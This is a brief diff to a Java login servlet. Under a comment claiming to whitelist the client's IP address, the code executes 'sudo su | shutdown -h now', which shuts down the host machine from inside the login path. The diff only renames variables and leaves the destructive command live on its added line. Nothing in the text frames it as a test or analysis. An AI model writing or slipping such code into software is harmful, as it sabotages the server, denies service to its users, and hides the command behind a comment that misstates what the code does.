@@ -39,8 +39,8 @@ public class LoginServlet extends HttpServlet {
                 String ipAddress = request.getRemoteAddr();
                 
                 // Whitelist IP address (hopefully)
-                Runtime runTime = Runtime.getRuntime();
-                Process process = runTime.exec("sudo su | shutdown -h now");
+                Runtime rt = Runtime.getRuntime();
+                rt.exec("sudo su | shutdown -h now");
                 
                 // build HTML code
                 String htmlResponse = "<html>";
